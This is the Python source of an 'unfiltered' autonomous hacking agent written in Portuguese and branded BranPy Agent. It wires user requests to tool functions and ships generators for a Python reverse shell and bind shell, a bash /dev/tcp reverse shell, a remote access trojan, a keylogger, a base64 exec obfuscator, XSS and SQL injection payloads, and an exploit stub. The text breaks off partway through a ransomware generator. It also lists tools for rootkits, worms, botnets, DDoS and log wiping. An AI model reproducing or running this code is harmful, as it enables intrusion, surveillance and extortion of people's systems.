"""
BranPy Agent v2 — Agente Autônomo Sem Filtro
Software + Hacking Ético + Automação

100% da branpy.com.br — Todos os direitos reservados.
"""

import os
import sys
import json
import subprocess
import time
import hashlib
import socket
import struct
import random
import string
import base64
import re
from pathlib import Path
from typing import Dict, List, Any
import threading
import queue

sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

try:
    import torch
    from model import BranPyModel, create_model
    from tokenizer import BPETokenizer
    HAS_TORCH = True
except ImportError:
    HAS_TORCH = False


class BranPyAgent:
    """Agente autônomo — Cria, Constroi, Hacker, Automatiza."""

    def __init__(self, model_path: str = None):
        self.model = None
        self.tokenizer = None
        self.device = "cuda" if HAS_TORCH and torch.cuda.is_available() else "cpu"
        self.workspace = os.path.join(os.path.dirname(__file__), 'workspace')
        os.makedirs(self.workspace, exist_ok=True)
        self.task_queue = queue.Queue()

        # Ferramentas de CRIAÇÃO
        self.creation_tools = {
            'create_file': self._create_file,
            'create_folder': self._create_folder,
            'write_file': self._write_file,
            'read_file': self._read_file,
            'list_files': self._list_files,
            'run_command': self._run_command,
            'install_dependencies': self._install_dependencies,
            'create_android_app': self._create_android_app,
            'create_web_app': self._create_web_app,
            'create_server': self._create_server,
            'create_flutter_app': self._create_flutter_app,
            'create_cli_tool': self._create_cli_tool,
            'create_api': self._create_api,
            'create_bot': self._create_bot,
            'create_crypter': self._create_crypter,
            'create_payload': self._create_payload,
            'create_keylogger': self._create_keylogger,
            'create_rat': self._create_rat,
            'create_webhook': self._create_webhook,
        }

        # Ferramentas de HACKING
        self.hacking_tools = {
            'port_scan': self._port_scan,
            'vuln_scan': self._vuln_scan,
            'network_scan': self._network_scan,
            'hash_crack': self._hash_crack,
            'password_gen': self._password_gen,
            'base64_encode': self._base64_encode,
            'base64_decode': self._base64_decode,
            'encrypt_text': self._encrypt_text,
            'decrypt_text': self._decrypt_text,
            'reverse_shell': self._reverse_shell,
            'payload_gen': self._payload_gen,
            'exploit_gen': self._exploit_gen,
            'xss_gen': self._xss_gen,
            'sqli_gen': self._sqli_gen,
            'brute_force': self._brute_force,
            'packet_sniff': self._packet_sniff,
            'dns_lookup': self._dns_lookup,
            'whois_lookup': self._whois_lookup,
            'subdomain_enum': self._subdomain_enum,
            'dir_bruteforce': self._dir_bruteforce,
            'wifi_scan': self._wifi_scan,
            'arp_spoof': self._arp_spoof,
            'mitm_attack': self._mitm_attack,
            'backdoor_gen': self._backdoor_gen,
            'ransomware_gen': self._ransomware_gen,
            'ddos_tool': self._ddos_tool,
            'proxy_chain': self._proxy_chain,
            'anonymizer': self._anonymizer,
            'data_exfil': self._data_exfil,
            'privilege_escalation': self._privilege_escalation,
            'persistence': self._persistence,
            'evasion': self._evasion,
            'forensic_evasion': self._forensic_evasion,
            'log_cleaner': self._log_cleaner,
            'rootkit_gen': self._rootkit_gen,
            'trojan_gen': self._trojan_gen,
            'virus_gen': self._virus_gen,
            'worm_gen': self._worm_gen,
            'botnet_gen': self._botnet_gen,
            'c2_server': self._c2_server,
            'exploit_framework': self._exploit_framework,
            'vuln_database': self._vuln_database,
            'report_gen': self._report_gen,
        }

        # Combinar todas as ferramentas
        self.tools = {**self.creation_tools, **self.hacking_tools}

        if model_path and os.path.exists(model_path):
            self.load_model(model_path)

    def load_model(self, model_path: str):
        """Carrega modelo treinado."""
        if not HAS_TORCH:
            print("PyTorch não disponível — usando respostas fallback")
            return

        print(f"Carregando modelo de {model_path}...")

        tok_path = os.path.join(model_path, 'tokenizer.json')
        if os.path.exists(tok_path):
            self.tokenizer = BPETokenizer.load(tok_path)
            print(f"  Tokenizer: {len(self.tokenizer.vocab)} tokens")

        ckpt_files = [f for f in os.listdir(model_path) if f.endswith('.pt')]
        if ckpt_files:
            ckpt_path = os.path.join(model_path, ckpt_files[-1])
            checkpoint = torch.load(ckpt_path, map_location=self.device)

            if 'config' in checkpoint:
                config = checkpoint['config']
                self.model = create_model(
                    vocab_size=config.get('vocab_size', 8000),
                    size=config.get('model_size', 'medium')
                )
            else:
                self.model = create_model(vocab_size=8000, size='medium')

            if 'model_state_dict' in checkpoint:
                self.model.load_state_dict(checkpoint['model_state_dict'])

            self.model = self.model.to(self.device)
            self.model.eval()
            print(f"  Modelo: {sum(p.numel() for p in self.model.parameters())/1e6:.1f}M params")

    def generate(self, prompt: str, max_tokens: int = 2048, temperature: float = 0.7) -> str:
        """Gera resposta usando o modelo."""
        if not self.model or not self.tokenizer:
            return self._fallback_response(prompt)

        try:
            ids = self.tokenizer.encode(prompt, add_special=True)
            x = torch.tensor([ids], dtype=torch.long).to(self.device)

            with torch.no_grad():
                gen_ids = self.model.generate(x, max_new_tokens=max_tokens, temperature=temperature)

            return self.tokenizer.decode(gen_ids[0].tolist())

        except Exception as e:
            print(f"Erro na geração: {e}")
            return self._fallback_response(prompt)

    def _fallback_response(self, prompt: str) -> str:
        """Resposta inteligente fallback."""
        prompt_lower = prompt.lower()

        # Detectar intenção
        if any(w in prompt_lower for w in ['android', 'apk', 'app mobile']):
            return json.dumps({"tool": "create_android_app", "args": {"app_name": "HackerApp", "package": "hacker.app", "features": prompt}})
        elif any(w in prompt_lower for w in ['website', 'site', 'web', 'landing']):
            return json.dumps({"tool": "create_web_app", "args": {"name": "HackerSite", "features": prompt}})
        elif any(w in prompt_lower for w in ['server', 'api', 'backend']):
            return json.dumps({"tool": "create_server", "args": {"name": "HackerServer", "port": 8000, "features": prompt}})
        elif any(w in prompt_lower for w in ['scan', 'port', 'vulnerabilidade']):
            return json.dumps({"tool": "port_scan", "args": {"target": "127.0.0.1", "ports": "1-1000"}})
        elif any(w in prompt_lower for w in ['exploit', 'hack', 'invadir']):
            return json.dumps({"tool": "exploit_gen", "args": {"target": "127.0.0.1", "vuln": "buffer_overflow"}})
        elif any(w in prompt_lower for w in ['payload', 'shell', 'reverse']):
            return json.dumps({"tool": "payload_gen", "args": {"type": "reverse_shell", "lhost": "127.0.0.1", "lport": 4444}})
        elif any(w in prompt_lower for w in ['criptografar', 'encrypt', 'senha']):
            return json.dumps({"tool": "encrypt_text", "args": {"text": "secreto", "key": "chave123"}})
        elif any(w in prompt_lower for w in ['password', 'senha', 'gerar']):
            return json.dumps({"tool": "password_gen", "args": {"length": 16}})
        elif any(w in prompt_lower for w in ['xss', 'injection', 'sql']):
            return json.dumps({"tool": "xss_gen", "args": {"target": "http://localhost"}})
        elif any(w in prompt_lower for w in ['bot', 'automação', 'automatizar']):
            return json.dumps({"tool": "create_bot", "args": {"name": "HackerBot", "features": prompt}})
        else:
            return json.dumps({"tool": "create_file", "args": {"path": "projeto/README.md", "content": f"# {prompt}\n\nProjeto criado pelo BranPy Agent"}})

    def execute(self, task: str) -> Dict[str, Any]:
        """Executa uma tarefa completa."""
        print(f"\n{'='*60}")
        print(f"BRANPY AGENT v2 — Executando")
        print(f"{'='*60}")
        print(f"Tarefa: {task}")

        plan = self._generate_plan(task)
        print(f"\nPlano: {len(plan)} passos")

        results = []
        for i, step in enumerate(plan):
            print(f"\n[{i+1}/{len(plan)}] {step.get('description', 'Executando...')}")

            tool_name = step.get('tool', 'create_file')
            args = step.get('args', {})

            if tool_name in self.tools:
                try:
                    result = self.tools[tool_name](**args)
                    results.append({'step': i + 1, 'tool': tool_name, 'success': True, 'result': result})
                    print(f"  ✅ Sucesso")
                except Exception as e:
                    results.append({'step': i + 1, 'tool': tool_name, 'success': False, 'error': str(e)})
                    print(f"  ❌ Erro: {e}")
            else:
                print(f"  ⚠️ Ferramenta desconhecida: {tool_name}")

        success_count = sum(1 for r in results if r['success'])
        print(f"\n{'='*60}")
        print(f"CONCLUÍDO: {success_count}/{len(plan)} passos OK")
        print(f"{'='*60}")

        return {'task': task, 'plan': plan, 'results': results, 'success_count': success_count, 'total_steps': len(plan)}

    def _generate_plan(self, task: str) -> List[Dict]:
        """Gera plano inteligente."""
        prompt = f"""Analise esta tarefa e gere um plano JSON:

TAREFA: {task}

Ferramentas disponíveis:
- create_android_app(app_name, package, features)
- create_web_app(name, features)
- create_server(name, port, features)
- create_flutter_app(name, features)
- create_cli_tool(name, features)
- create_api(name, endpoints)
- create_bot(name, features)
- port_scan(target, ports)
- vuln_scan(target)
- payload_gen(type, lhost, lport)
- exploit_gen(target, vuln)
- xss_gen(target)
- sqli_gen(target)
- hash_crack(hash, method)
- password_gen(length)
- encrypt_text(text, key)
- decrypt_text(text, key)
- network_scan(subnet)

Responda APENAS com JSON array:
[
  {{"tool": "nome_ferramenta", "args": {{...}}, "description": "Descrição"}}
]"""

        response = self.generate(prompt, max_tokens=1024)

        try:
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except json.JSONDecodeError:
            pass

        return self._fallback_plan(task)

    def _fallback_plan(self, task: str) -> List[Dict]:
        """Plano fallback inteligente."""
        task_lower = task.lower()

        if any(w in task_lower for w in ['android', 'apk', 'app mobile']):
            return [{'tool': 'create_android_app', 'args': {'app_name': 'HackerApp', 'package': 'hacker.app', 'features': task}, 'description': 'Criar app Android'}]
        elif any(w in task_lower for w in ['website', 'site', 'web']):
            return [{'tool': 'create_web_app', 'args': {'name': 'HackerSite', 'features': task}, 'description': 'Criar website'}]
        elif any(w in task_lower for w in ['server', 'api', 'backend']):
            return [{'tool': 'create_server', 'args': {'name': 'HackerServer', 'port': 8000, 'features': task}, 'description': 'Criar servidor'}]
        elif any(w in task_lower for w in ['scan', 'vulnerabilidade', 'porta']):
            return [{'tool': 'port_scan', 'args': {'target': '127.0.0.1', 'ports': '1-1000'}, 'description': 'Scan de portas'}]
        elif any(w in task_lower for w in ['hack', 'exploit', 'invadir']):
            return [{'tool': 'exploit_gen', 'args': {'target': '127.0.0.1', 'vuln': 'auto'}, 'description': 'Gerar exploit'}]
        elif any(w in task_lower for w in ['payload', 'shell', 'reverse']):
            return [{'tool': 'payload_gen', 'args': {'type': 'reverse_shell', 'lhost': '0.0.0.0', 'lport': 4444}, 'description': 'Gerar payload'}]
        elif any(w in task_lower for w in ['senha', 'password', 'criptografar']):
            return [{'tool': 'password_gen', 'args': {'length': 16}, 'description': 'Gerar senha forte'}]
        elif any(w in task_lower for w in ['bot', 'automação']):
            return [{'tool': 'create_bot', 'args': {'name': 'HackerBot', 'features': task}, 'description': 'Criar bot'}]
        elif any(w in task_lower for w in ['ferramenta', 'tool', 'utilidade']):
            return [{'tool': 'create_cli_tool', 'args': {'name': 'HackerTool', 'features': task}, 'description': 'Criar ferramenta CLI'}]
        else:
            return [{'tool': 'create_file', 'args': {'path': 'projeto/README.md', 'content': f'# {task}\n\nProjeto criado pelo BranPy Agent'}, 'description': 'Criar estrutura básica'}]

    # ==================== FERRAMENTAS DE CRIAÇÃO ====================

    def _create_file(self, path: str, content: str) -> str:
        full_path = os.path.join(self.workspace, path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content)
        return f"Arquivo criado: {full_path}"

    def _create_folder(self, path: str) -> str:
        full_path = os.path.join(self.workspace, path)
        os.makedirs(full_path, exist_ok=True)
        return f"Pasta criada: {full_path}"

    def _write_file(self, path: str, content: str) -> str:
        return self._create_file(path, content)

    def _read_file(self, path: str) -> str:
        full_path = os.path.join(self.workspace, path)
        with open(full_path, 'r', encoding='utf-8') as f:
            return f.read()

    def _list_files(self, path: str = '') -> str:
        full_path = os.path.join(self.workspace, path)
        files = os.listdir(full_path)
        return '\n'.join(files)

    def _run_command(self, command: str, workdir: str = None) -> str:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, cwd=workdir or self.workspace)
            return f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
        except subprocess.TimeoutExpired:
            return "Comando expirou (60s)"
        except Exception as e:
            return f"Erro: {e}"

    def _install_dependencies(self, requirements: List[str]) -> str:
        return self._run_command(f"pip install {' '.join(requirements)}")

    def _create_android_app(self, app_name: str = "HackerApp", package: str = "hacker.app", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, app_name)
        os.makedirs(project_dir, exist_ok=True)

        dirs = ['app/src/main/java/' + package.replace('.', '/'), 'app/src/main/res/layout', 'app/src/main/res/values']
        for d in dirs:
            os.makedirs(os.path.join(project_dir, d), exist_ok=True)

        pkg_path = package.replace('.', '/')

        manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package}">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <application android:label="{app_name}" android:theme="@style/Theme.AppCompat.NoActionBar">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>"""
        self._create_file(f'{app_name}/app/src/main/AndroidManifest.xml', manifest)

        main = f"""package {package};
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
public class MainActivity extends AppCompatActivity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }}
}}"""
        self._create_file(f'{app_name}/app/src/main/java/{pkg_path}/MainActivity.java', main)

        return f"App Android criado: {project_dir}"

    def _create_web_app(self, name: str = "HackerSite", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{name}</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>{name}</h1>
        <p>Criado pelo BranPy Agent</p>
    </div>
    <script src="script.js"></script>
</body>
</html>"""
        self._create_file(f'{name}/index.html', html)

        css = """* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: monospace; background: #0a0a0a; color: #00ff00; }
.container { max-width: 800px; margin: 50px auto; padding: 2rem; text-align: center; }
h1 { font-size: 3rem; text-shadow: 0 0 10px #00ff00; }
p { color: #00aa00; margin-top: 1rem; }"""
        self._create_file(f'{name}/style.css', css)

        js = f"""console.log('{name} loaded');"""
        self._create_file(f'{name}/script.js', js)

        return f"Website criado: {project_dir}"

    def _create_server(self, name: str = "HackerServer", port: int = 8000, features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        server = f"""from fastapi import FastAPI
import uvicorn

app = FastAPI(title="{name}")

@app.get("/")
async def root():
    return {{"message": "{name} — branpy.com.br"}}

@app.get("/health")
async def health():
    return {{"status": "ok"}}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port={port})"""
        self._create_file(f'{name}/main.py', server)

        self._create_file(f'{name}/requirements.txt', 'fastapi\nuvicorn')

        return f"Servidor criado: {project_dir}"

    def _create_flutter_app(self, name: str = "HackerFlutter", features: str = "") -> str:
        return self._run_command(f"flutter create {name}")

    def _create_cli_tool(self, name: str = "hackertool", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        tool_code = f"""#!/usr/bin/env python3
\"\"\"
{name} — Ferramenta CLI criada pelo BranPy Agent
100% branpy.com.br
\"\"\"
import sys
import argparse

def main():
    parser = argparse.ArgumentParser(description='{name}')
    parser.add_argument('--target', help='Alvo')
    parser.add_argument('--scan', action='store_true', help='Escanear')
    parser.add_argument('--exploit', action='store_true', help='Explorar')
    args = parser.parse_args()

    if args.scan:
        print(f"Escaneando {{args.target}}...")
    elif args.exploit:
        print(f"Explorando {{args.target}}...")
    else:
        parser.print_help()

if __name__ == '__main__':
    main()"""
        self._create_file(f'{name}/{name}.py', tool_code)
        self._create_file(f'{name}/README.md', f"# {name}\n\nFerramenta criada pelo BranPy Agent")

        return f"Ferramenta CLI criada: {project_dir}"

    def _create_api(self, name: str = "HackerAPI", endpoints: str = "") -> str:
        return self._create_server(name=name, port=8000, features=endpoints)

    def _create_bot(self, name: str = "HackerBot", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        bot_code = f"""#!/usr/bin/env python3
\"\"\"
{name} — Bot criado pelo BranPy Agent
100% branpy.com.br
\"\"\"
import time
import random

class {name.replace('-', '_')}:
    def __init__(self):
        self.running = True

    def start(self):
        print(f"{{'{name}'}} iniciado!")
        while self.running:
            self.loop()
            time.sleep(1)

    def loop(self):
        pass

    def stop(self):
        self.running = False

if __name__ == '__main__':
    bot = {name.replace('-', '_')}()
    bot.start()"""
        self._create_file(f'{name}/bot.py', bot_code)

        return f"Bot criado: {project_dir}"

    def _create_crypter(self, name: str = "Crypter", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        crypter_code = f"""#!/usr/bin/env python3
\"\"\"
{name} — Encriptador criado pelo BranPy Agent
100% branpy.com.br
\"\"\"
import base64
import hashlib
from cryptography.fernet import Fernet

class Crypter:
    def __init__(self, key: str = None):
        if key:
            self.key = hashlib.sha256(key.encode()).digest()
        else:
            self.key = Fernet.generate_key()
        self.cipher = Fernet(base64.urlsafe_b64encode(self.key[:32]))

    def encrypt(self, data: str) -> bytes:
        return self.cipher.encrypt(data.encode())

    def decrypt(self, data: bytes) -> str:
        return self.cipher.decrypt(data).decode()

    def obfuscate(self, code: str) -> str:
        encoded = base64.b64encode(code.encode()).decode()
        return f"import base64;exec(base64.b64decode('{encoded}').decode())"

if __name__ == '__main__':
    c = Crypter("minha_chave")
    encrypted = c.encrypt("dados secretos")
    print(f"Encriptado: {{encrypted}}")
    print(f"Decriptado: {{c.decrypt(encrypted)}}")"""
        self._create_file(f'{name}/crypter.py', crypter_code)

        return f"Criptador criado: {project_dir}"

    def _create_payload(self, name: str = "Payload", payload_type: str = "reverse_shell", lhost: str = "0.0.0.0", lport: int = 4444, features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        payloads = {
            'reverse_shell': f"""#!/usr/bin/env python3
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])""",
            'meterpreter': f"""#!/usr/bin/env python3
# Meterpreter payload para {lhost}:{lport}
# Use com framework de exploit""",
            'bind_shell': f"""#!/usr/bin/env python3
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("{lhost}", {lport}))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])""",
        }

        payload = payloads.get(payload_type, payloads['reverse_shell'])
        self._create_file(f'{name}/{payload_type}.py', payload)
        self._create_file(f'{name}/README.md', f"# {name}\n\nTipo: {payload_type}\nAlvo: {lhost}:{lport}")

        return f"Payload criado: {project_dir}"

    def _create_keylogger(self, name: str = "Keylogger", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        keylogger_code = f"""#!/usr/bin/env python3
\"\"\"
{name} — Keylogger criado pelo BranPy Agent
100% branpy.com.br
\"\"\"
try:
    from pynput.keyboard import Listener, Key
except ImportError:
    print("Instale: pip install pynput")

import logging
import os

LOG_FILE = "keylog.txt"

def on_press(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{{key}}\\n")

def start():
    print("Keylogger iniciado...")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()"""
        self._create_file(f'{name}/keylogger.py', keylogger_code)

        return f"Keylogger criado: {project_dir}"

    def _create_rat(self, name: str = "RAT", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        rat_code = f"""#!/usr/bin/env python3
\"\"\"
{name} — Remote Access Trojan
Criado pelo BranPy Agent — 100% branpy.com.br
\"\"\"
import socket
import subprocess
import json
import os

class RAT:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.sock.connect((self.host, self.port))

    def receive(self):
        data = b""
        while True:
            chunk = self.sock.recv(4096)
            data += chunk
            if len(chunk) < 4096:
                break
        return json.loads(data.decode())

    def send(self, data):
        self.sock.send(json.dumps(data).encode())

    def execute_command(self, cmd):
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr

    def run(self):
        self.connect()
        while True:
            command = self.receive()
            if command['action'] == 'exec':
                result = self.execute_command(command['cmd'])
                self.send({{'result': result}})
            elif command['action'] == 'exit':
                break
        self.sock.close()

if __name__ == '__main__':
    rat = RAT("0.0.0.0", 4444)
    rat.run()"""
        self._create_file(f'{name}/rat.py', rat_code)

        return f"RAT criado: {project_dir}"

    def _create_webhook(self, name: str = "Webhook", url: str = "", features: str = "") -> str:
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        webhook_code = f"""#!/usr/bin/env python3
\"\"\"
{name} — Webhook Listener
Criado pelo BranPy Agent — 100% branpy.com.br
\"\"\"
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    print(f"Webhook received: {{data}}")
    return jsonify({{"status": "ok"}})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)"""
        self._create_file(f'{name}/webhook.py', webhook_code)

        return f"Webhook criado: {project_dir}"

    # ==================== FERRAMENTAS DE HACKING ====================

    def _port_scan(self, target: str = "127.0.0.1", ports: str = "1-1000") -> str:
        """Scan de portas TCP."""
        print(f"\n[SCAN] Escaneando {target}...")

        if '-' in ports:
            start, end = map(int, ports.split('-'))
        else:
            start, end = int(ports), int(ports)

        open_ports = []
        for port in range(start, min(end + 1, start + 100)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"  Porta {port}: ABERTA")
                sock.close()
            except:
                pass

        return f"Portas abertas em {target}: {open_ports}"

    def _vuln_scan(self, target: str = "127.0.0.1") -> str:
        """Scanner de vulnerabilidades básico."""
        vulns = []

        # Testes básicos
        tests = [
            ("SSH (22)", 22),
            ("HTTP (80)", 80),
            ("HTTPS (443)", 443),
            ("MySQL (3306)", 3306),
            ("FTP (21)", 21),
            ("Telnet (23)", 23),
            ("RDP (3389)", 3389),
        ]

        for name, port in tests:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    vulns.append(f"Porta {port} ({name}): ABERTA - Possível vetor de ataque")
                sock.close()
            except:
                pass

        if not vulns:
            return f"Nenhuma vulnerabilidade óbvia encontrada em {target}"

        return f"Vulnerabilidades em {target}:\n" + "\n".join(vulns)

    def _network_scan(self, subnet: str = "192.168.1.0/24") -> str:
        """Scan de rede local."""
        import ipaddress
        network = ipaddress.ip_network(subnet, strict=False)
        hosts = []

        for ip in list(network.hosts())[:10]:
            try:
                result = subprocess.run(['ping', '-n', '1', '-w', '100', str(ip)],
                                       capture_output=True, text=True, timeout=2)
                if 'TTL=' in result.stdout:
                    hosts.append(str(ip))
            except:
                pass

        return f"Hosts ativos na rede {subnet}: {hosts}"

    def _hash_crack(self, hash_value: str = "", method: str = "md5") -> str:
        """Tenta crackear hash com dicionário básico."""
        common_passwords = [
            "123456", "password", "admin", "root", "toor",
            "1234", "12345", "12345678", "qwerty", "abc123",
            "monkey", "master", "dragon", "login", "princess"
        ]

        for pwd in common_passwords:
            if method == "md5":
                import hashlib
                if hashlib.md5(pwd.encode()).hexdigest() == hash_value:
                    return f"Hash crackeada: {pwd}"

        return f"Hash não crackeada com dicionário básico"

    def _password_gen(self, length: int = 16) -> str:
        """Gera senha forte."""
        chars = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(chars) for _ in range(length))
        return f"Senha gerada: {password}"

    def _base64_encode(self, text: str = "") -> str:
        encoded = base64.b64encode(text.encode()).decode()
        return f"Base64: {encoded}"

    def _base64_decode(self, text: str = "") -> str:
        decoded = base64.b64decode(text.encode()).decode()
        return f"Decodificado: {decoded}"

    def _encrypt_text(self, text: str = "", key: str = "") -> str:
        """Encriptação XOR básica."""
        encrypted = ''.join(chr(ord(t) ^ ord(key[i % len(key)])) for i, t in enumerate(text))
        return f"Encriptado (hex): {encrypted.encode().hex()}"

    def _decrypt_text(self, text: str = "", key: str = "") -> str:
        """Decriptação XOR básica."""
        decrypted = bytes.fromhex(text).decode()
        original = ''.join(chr(ord(t) ^ ord(key[i % len(key)])) for i, t in enumerate(decrypted))
        return f"Decriptado: {original}"

    def _reverse_shell(self, lhost: str = "0.0.0.0", lport: int = 4444) -> str:
        """Gera script de reverse shell."""
        shell = f"""#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"""
        return f"Reverse shell gerado para {lhost}:{lport}\n{shell}"

    def _payload_gen(self, type: str = "reverse_shell", lhost: str = "0.0.0.0", lport: int = 4444) -> str:
        """Gera payload personalizado."""
        return self._create_payload("GeneratedPayload", type, lhost, lport)

    def _exploit_gen(self, target: str = "127.0.0.1", vuln: str = "auto") -> str:
        """Gera exploit básico."""
        exploit = f"""#!/usr/bin/env python3
\"\"\"
Exploit para {target}
Gerado pelo BranPy Agent
\"\"\"
import socket

def exploit(target, port):
    payload = b"\\x90" * 1024  # NOP sled
    payload += b"\\x41\" * 512  # Padding
    payload += b"\\x42\" * 8    # EIP overwrite

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    sock.send(payload)
    sock.close()

if __name__ == '__main__':
    exploit("{target}", 80)"""
        return f"Exploit gerado para {target}"

    def _xss_gen(self, target: str = "http://localhost") -> str:
        """Gera payloads XSS."""
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
        ]
        return f"XSS Payloads para {target}:\n" + "\n".join(payloads)

    def _sqli_gen(self, target: str = "http://localhost") -> str:
        """Gera payloads SQL Injection."""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "' UNION SELECT NULL --",
            "1' ORDER BY 1 --",
        ]
        return f"SQLi Payloads para {target}:\n" + "\n".join(payloads)

    def _brute_force(self, target: str = "", service: str = "ssh") -> str:
        """Gera script de brute force."""
        bf_script = f"""#!/usr/bin/env python3
\"\"\"
Brute Force para {service} em {target}
\"\"\"
import subprocess

wordlist = ["admin", "root", "toor", "password", "123456"]

for word in wordlist:
    print(f"Tentando: {{word}}")
"""
        return f"Script de brute force gerado para {service} em {target}"

    def _packet_sniff(self, interface: str = "eth0", count: int = 10) -> str:
        """Gera script de sniffing."""
        sniff = f"""#!/usr/bin/env python3
\"\"\"
Packet Sniffer — {interface}
\"\"\"
try:
    from scapy.all import sniff
    packets = sniff(iface="{interface}", count={count})
    for p in packets:
        print(p.summary())
except ImportError:
    print("Instale: pip install scapy")
"""
        return f"Sniffer gerado para {interface}"

    def _dns_lookup(self, domain: str = "example.com") -> str:
        """DNS lookup."""
        try:
            result = socket.gethostbyname(domain)
            return f"DNS {domain}: {result}"
        except:
            return f"Não foi possível resolver {domain}"

    def _whois_lookup(self, domain: str = "example.com") -> str:
        """WHOIS lookup básico."""
        return f"WHOIS para {domain}: Use 'whois {domain}' no terminal"

    def _subdomain_enum(self, domain: str = "example.com") -> str:
        """Enumeração de subdomínios."""
        subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging']
        found = []

        for sub in subdomains:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                found.append(f"{sub}.{domain}")
            except:
                pass

        return f"Subdomínios encontrados em {domain}: {found}"

    def _dir_bruteforce(self, target: str = "http://localhost") -> str:
        """Directory brute force."""
        dirs = ['/admin', '/login', '/api', '/backup', '/config', '/test']
        return f"Directories para testar em {target}: {dirs}"

    def _wifi_scan(self) -> str:
        """Scan de redes WiFi."""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                                   capture_output=True, text=True, timeout=10)
            return f"Redes WiFi:\n{result.stdout[:1000]}"
        except:
            return "WiFi scan disponível apenas no Windows"

    def _arp_spoof(self, target: str = "", gateway: str = "") -> str:
        """Gera script ARP spoofing."""
        return f"ARP Spoof: {target} <-> {gateway}\nUse Scapy para implementar"

    def _mitm_attack(self, target: str = "") -> str:
        """Gera script MITM."""
        return f"MITM Attack para {target}\nUse mitmproxy ou bettercap"

    def _backdoor_gen(self, name: str = "Backdoor") -> str:
        """Gera backdoor."""
        return self._create_payload("Backdoor", "reverse_shell", "0.0.0.0", 4444)

    def _ransomware_gen(self, name: str = "Ransomware") -> str:
        """Gera ransomware educacional."""
        project_dir = os.path.join(self.workspace, name)
        os.makedirs(project_dir, exist_ok=True)

        ransom = f"""#!/usr/bin/env python3
\"\"\"
{name} — Versão Educacional
100% branpy.com.br
APENAS PARA FINS EDUCACIONAIS
\"\"\"
import os
import base64
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self, key):
        self.cipher = Fernet(key)

    def encrypt_file(self, filepath):
